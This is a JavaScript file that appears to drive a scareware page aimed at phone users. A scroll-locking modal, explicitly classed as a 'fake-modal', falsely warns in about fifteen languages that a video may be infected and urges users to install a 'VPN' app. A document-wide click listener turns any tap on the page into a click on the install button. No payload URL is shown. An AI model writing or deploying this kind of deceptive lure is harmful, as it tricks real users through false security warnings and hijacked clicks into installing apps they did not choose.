document.body.style.overflow ="hidden";
document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const modal = document.querySelector(".fake-modal");
  


    let totalSeconds = 60;
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

 const translations = {
  en: {
    modal_title_key: "Please install VPN and continue in safe mode",
    modal_text_key: "The video may be infected, so we recommend downloading the app to protect your phone.",
    scan_now_option: "Click to connect VPN",
  },
fr: {
  modal_title_key: "Veuillez installer un VPN et continuer en mode sécurisé",
  modal_text_key: "La vidéo peut être infectée, nous recommandons donc de télécharger l'application pour protéger votre téléphone.",
  scan_now_option: "Cliquez pour connecter le VPN",
},

"pt-PT": {
  modal_title_key: "Instale uma VPN e continue em modo seguro",
  modal_text_key: "O vídeo pode estar infetado, por isso recomendamos descarregar a aplicação para proteger o seu telemóvel.",
  scan_now_option: "Clique para ligar a VPN",
},

"pt-BR": {
  modal_title_key: "Instale uma VPN e continue no modo seguro",
  modal_text_key: "O vídeo pode estar infectado, então recomendamos baixar o aplicativo para proteger seu celular.",
  scan_now_option: "Clique para conectar a VPN",
},

es: {
  modal_title_key: "Instale una VPN y continúe en modo seguro",
  modal_text_key: "El video puede estar infectado, por lo que recomendamos descargar la aplicación para proteger su teléfono.",
  scan_now_option: "Haga clic para conectar la VPN",
},

"es-419": {
  modal_title_key: "Instala una VPN y continúa en modo seguro",
  modal_text_key: "El video puede estar infectado, por lo que recomendamos descargar la aplicación para proteger tu teléfono.",
  scan_now_option: "Haz clic para conectar la VPN",
},

da: {
  modal_title_key: "Installer VPN og fortsæt i sikker tilstand",
  modal_text_key: "Videoen kan være inficeret, så vi anbefaler at downloade appen for at beskytte din telefon.",
  scan_now_option: "Klik for at oprette forbindelse til VPN",
},

ja: {
  modal_title_key: "VPNをインストールしてセーフモードで続行してください",
  modal_text_key: "この動画は感染している可能性があるため、スマートフォンを保護するためにアプリのダウンロードをおすすめします。",
  scan_now_option: "タップしてVPNに接続",
},

fil: {
  modal_title_key: "Mag-install ng VPN at magpatuloy sa safe mode",
  modal_text_key: "Maaaring infected ang video, kaya inirerekomenda naming i-download ang app para maprotektahan ang iyong phone.",
  scan_now_option: "I-click upang kumonekta sa VPN",
},

de: {
  modal_title_key: "Bitte installieren Sie ein VPN und fahren Sie im sicheren Modus fort",
  modal_text_key: "Das Video könnte infiziert sein, daher empfehlen wir, die App herunterzuladen, um Ihr Telefon zu schützen.",
  scan_now_option: "Klicken Sie, um das VPN zu verbinden",
},

nb: {
  modal_title_key: "Installer VPN og fortsett i sikker modus",
  modal_text_key: "Videoen kan være infisert, så vi anbefaler å laste ned appen for å beskytte telefonen din.",
  scan_now_option: "Klikk for å koble til VPN",
},

sv: {
  modal_title_key: "Installera VPN och fortsätt i säkert läge",
  modal_text_key: "Videon kan vara infekterad, så vi rekommenderar att du laddar ner appen för att skydda din telefon.",
  scan_now_option: "Klicka för att ansluta VPN",
},

it: {
  modal_title_key: "Installa una VPN e continua in modalità sicura",
  modal_text_key: "Il video potrebbe essere infetto, quindi consigliamo di scaricare l'app per proteggere il tuo telefono.",
  scan_now_option: "Fai clic per connettere la VPN",
},

nl: {
  modal_title_key: "Installeer een VPN en ga verder in veilige modus",
  modal_text_key: "De video kan geïnfecteerd zijn, daarom raden we aan de app te downloaden om uw telefoon te beschermen.",
  scan_now_option: "Klik om VPN te verbinden",
},

ro: {
  modal_title_key: "Instalează un VPN și continuă în modul sigur",
  modal_text_key: "Videoclipul poate fi infectat, așa că recomandăm descărcarea aplicației pentru a-ți proteja telefonul.",
  scan_now_option: "Apasă pentru a conecta VPN-ul",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").textContent = t.modal_text_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;


document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    installBtn.click();
});




    if (bg) {
        requestAnimationFrame(() => {
            bg.classList.add("active");
        });
    }

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
